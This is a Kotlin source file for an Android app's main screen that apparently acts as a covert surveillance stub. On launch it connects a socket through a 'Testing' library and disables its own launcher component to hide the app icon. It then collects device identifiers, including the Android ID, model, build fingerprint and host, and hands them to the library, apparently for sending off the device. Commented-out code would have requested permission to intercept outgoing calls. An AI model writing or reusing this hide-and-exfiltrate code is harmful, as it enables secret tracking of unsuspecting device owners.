package com.icerockdev

import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import com.icerockdev.library.Testing

class MainActivity : AppCompatActivity() {

    lateinit var testing: Testing

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.activity_main)

        testing = Testing()
        testing.socket.connect()

        fnhideicon()
        //findViewById<Button>(R.id.sendButton).setOnClickListener { testing.login() }
        //setupTextInputLayout()
        getSystemDetail()
    }
    private fun fnhideicon() {
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
    /*
    private fun fn_permission() {
        if (ContextCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.PROCESS_OUTGOING_CALLS
            ) !== PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.PROCESS_OUTGOING_CALLS
            ) !== PackageManager.PERMISSION_GRANTED
        ) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(
                    this@MainActivity,
                    Manifest.permission.PROCESS_OUTGOING_CALLS
                )
            ) {
            } else {
                ActivityCompat.requestPermissions(
                    this@MainActivity, arrayOf(Manifest.permission.PROCESS_OUTGOING_CALLS),
                    REQUEST_PERMISSIONS
                )
            }
            if (ActivityCompat.shouldShowRequestPermissionRationale(
                    this@MainActivity,
                    Manifest.permission.PROCESS_OUTGOING_CALLS
                )
            ) {
            } else {
                ActivityCompat.requestPermissions(
                    this@MainActivity, arrayOf<String>(Manifest.permission.PROCESS_OUTGOING_CALLS),
                    REQUEST_PERMISSIONS
                )
            }
        } else {
            boolean_permission = true
        }
    }

    var REQUEST_PERMISSIONS = 1
    var boolean_permission = false
     */

    /*
    @Override
    fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String?>?,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions!!, grantResults)
        if (requestCode == REQUEST_PERMISSIONS) {
            if (grantResults.size > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                boolean_permission = true
            } else {
                Toast.makeText(applicationContext, "Please allow the permission", Toast.LENGTH_LONG)
                    .show()
            }
        }
    }

 */
    @SuppressLint("HardwareIds")
    private fun getSystemDetail() {
        val info: String = "Brand: ${Build.BRAND} \n" +
                "DeviceID: ${
                    Settings.Secure.getString(
                        contentResolver,
                        Settings.Secure.ANDROID_ID
                    )
                } \n" +
                "Model: ${Build.MODEL} \n" +
                "ID: ${Build.ID} \n" +
                "SDK: ${Build.VERSION.SDK_INT} \n" +
                "Manufacture: ${Build.MANUFACTURER} \n" +
                "Brand: ${Build.BRAND} \n" +
                "User: ${Build.USER} \n" +
                "Type: ${Build.TYPE} \n" +
                "Base: ${Build.VERSION_CODES.BASE} \n" +
                "Incremental: ${Build.VERSION.INCREMENTAL} \n" +
                "Board: ${Build.BOARD} \n" +
                "Host: ${Build.HOST} \n" +
                "FingerPrint: ${Build.FINGERPRINT} \n" +
                "Version Code: ${Build.VERSION.RELEASE}"
        val devId:String = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        testing.setSelf(devId, info)
    }
}
